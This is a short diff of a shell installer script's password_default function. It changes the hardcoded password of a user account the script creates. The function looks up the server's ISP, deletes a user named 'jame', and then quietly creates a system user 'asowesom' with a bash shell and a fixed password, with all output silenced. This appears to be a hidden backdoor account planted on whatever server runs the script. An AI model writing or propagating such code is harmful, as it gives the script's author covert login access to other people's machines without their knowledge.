@@ -337,7 +337,7 @@ function password_default() {
     ISP=$(wget -qO- ipinfo.io/org)
     userdel jame > /dev/null 2>&1
     Username="asowesom"
-    Password="Yaddy777"
+    Password="Tens@zang3tsu"
     mkdir -p /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
